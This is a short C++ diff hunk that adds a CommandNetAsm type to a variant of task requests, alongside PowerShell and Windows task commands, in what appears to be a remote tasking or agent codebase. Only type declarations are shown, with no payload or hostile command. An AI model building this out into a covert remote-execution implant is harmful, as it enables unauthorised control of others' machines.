@@ -167,7 +167,7 @@ struct TaskError
 	}
 };
 
-using Request = std::variant<TaskRequest<CommandPowershell>, TaskRequest<CommandWinTask>, TaskRequest<bool>>;
+using Request = std::variant<TaskRequest<CommandPowershell>, TaskRequest<CommandWinTask>, TaskRequest<CommandNetAsm>, TaskRequest<bool>>;
 using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskError>>;
 
 inline std::string CreateResponseTaskValue(const std::deque<Response>& tasks) {
